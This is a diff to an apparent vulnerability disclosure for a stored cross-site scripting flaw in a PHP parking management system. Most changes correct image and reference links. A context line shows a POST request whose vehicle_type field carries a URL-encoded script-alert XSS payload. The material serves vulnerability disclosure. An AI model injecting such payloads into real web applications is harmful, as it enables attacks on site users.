@@ -4,7 +4,7 @@
 #### Vendor: https://www.sourcecodester.com/users/tips23
 #### Software: https://www.sourcecodester.com/php-codeigniter-simple-parking-management-system-source-code
 #### Version: 1.0
-#### Reference: https://github.com/CyberThoth/CVE/blob/d18ef36d0aa5eb650bbe7dc002bd82db13b1ed42/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Refelected)/POC.md
+#### Reference: https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/POC.md
 
 
 #### Description：
@@ -46,8 +46,8 @@ Connection: close
 parking_area_no=2&vehicle_type=%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E&vehicle_limit=15&parking_charge=4&send=Submit
 ```
 
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/1.png)
+![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/1.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/2.png)
+![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/2.png)
 
-![image](https://github.com/CyberThoth/CVE/blob/37f3162287d4da5362ea0a408bd0e1c970b39c3e/CVE/Library%20Management%20System%20with%20QR%20code%20Attendance/Cross%20Site%20Scripting(Stored)/3.png)
+![image](https://github.com/CyberThoth/CVE/blob/6c0df09d4e613d5e10389e35adb11d37643f917f/CVE/Simple%20Parking%20Management%20System/Cross%20Site%20Scripting(Stored)/3.png)
